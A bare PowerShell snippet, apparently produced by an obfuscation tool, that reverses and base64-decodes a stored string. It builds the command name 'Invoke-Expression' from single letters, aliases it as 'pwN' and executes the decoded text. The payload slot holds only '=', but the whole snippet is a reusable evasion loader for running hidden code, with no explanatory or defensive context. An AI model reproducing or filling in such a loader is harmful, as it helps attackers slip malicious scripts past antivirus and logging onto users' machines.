$best64code = "=" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
$LOAdCode = [sYSTeM.tExt.enCOdiNG]::Utf8.geTstrIng([system.conVerT]::FROMbASE64STrinG("$bAse64")) ;
$PwN = "i"+"N"+"V"+"O"+"K"+"e"+"-"+"E"+"X"+"P"+"r"+"e"+"s"+"S"+"I"+"o"+"n" ; NEw-AlIAs -Name pwN -VAlUE $pwn -force ; pwN $lOAdCOdE ;
